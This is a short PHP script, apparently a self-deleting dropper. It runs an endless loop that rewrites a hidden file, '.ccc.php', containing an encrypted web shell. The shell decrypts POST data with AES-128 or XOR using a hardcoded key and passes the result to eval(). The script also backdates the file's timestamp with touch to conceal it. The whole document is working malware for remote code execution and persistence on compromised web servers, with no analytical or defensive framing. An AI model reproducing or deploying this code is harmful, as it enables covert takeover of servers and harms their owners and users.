<?php 
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.ccc.php';
    $code = '<?php
    @error_reporting(0);
    session_start();
        $key="02351f42f10fe4a1";
        $_SESSION["k"]=$key;
        session_write_close();
        $post=file_get_contents("php://input");
        if(!extension_loaded("openssl"))
        {
            $t="base64_"."decode";
            $post=$t($post."");
            
            for($i=0;$i<strlen($post);$i++) {
                     $post[$i] = $post[$i]^$key[$i+1&15]; 
                    }
        }
        else
        {
            $post=openssl_decrypt($post, "AES128", $key);
        }
        $arr=explode("|",$post);
        $func=$arr[0];
        $params=$arr[1];
        class C{public function __invoke($p) {eval($p."");}}
        @call_user_func(new C(),$params);
    ?>
    ';
    //pass=pass
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2021-12-01 09:10:12" .ccc.php');
        usleep(5000);
    }
?>